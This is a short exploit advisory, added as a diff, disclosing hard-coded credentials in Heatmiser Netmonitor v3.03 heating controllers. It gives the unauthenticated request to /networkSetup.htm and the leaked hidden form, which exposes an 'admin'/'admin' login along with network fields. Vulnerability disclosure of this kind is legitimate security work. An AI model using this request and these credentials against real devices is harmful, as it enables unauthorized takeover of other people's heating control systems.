@@ -1,0 +1,34 @@
+# Exploit Title: Heatmiser Netmonitor 3.03 - Hardcoded Credentials
+# Date: 2019-12-22 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.heatmiser.com/en/
+# Hardware Link: https://www.zoneregeling.nl/heatmiser/netmonitor-handleiding.pdf
+# Software: Netmonitor v3.03
+# Product Version: Netmonitor v3.03
+# CWE : CWE-798
+# Vulenrability: Use of Hard-coded Credentials
+# CVE: N/A
+
+# Decription :
+# Hard-coded Credentials security vulnerability of Netmonitor model v3.03
+# from Heatmiser manufacturer has been discovered. With this
+# vulnerability, the hidFrm form in the source code of the page
+# anonymously has access to hidden input codes. This information is
+# contained in the input field of the hidFrm form in the source code
+# lognm and logpd.
+
+
+HTTP GET Request : /networkSetup.htm HTTP/1.1
+
+<form name="hidFrm" method="post">
+<input type="hidden" name="lognm" value="admin">
+<input type="hidden" name="logpd" value="admin">
+<input type="hidden" name="ip" value="XXX.XXX.XXX.XXX">
+<input type="hidden" name="mask" value="XXX.XXX.XXX.XXX">
+<input type="hidden" name="gate" value="XXX.XXX.XXX.XXX">
+<input type="hidden" name="dns" value="XXX.XXX.XXX.XXX">
+<input type="hidden" name="timestr" value="04:27">
+<input type="hidden" name="datestr" value="23/12/2019">
+<input type="hidden" name="timeflag" ,="" value="0">
+<input type="hidden" name="gmtflag" ,="" value="1">
+</form>
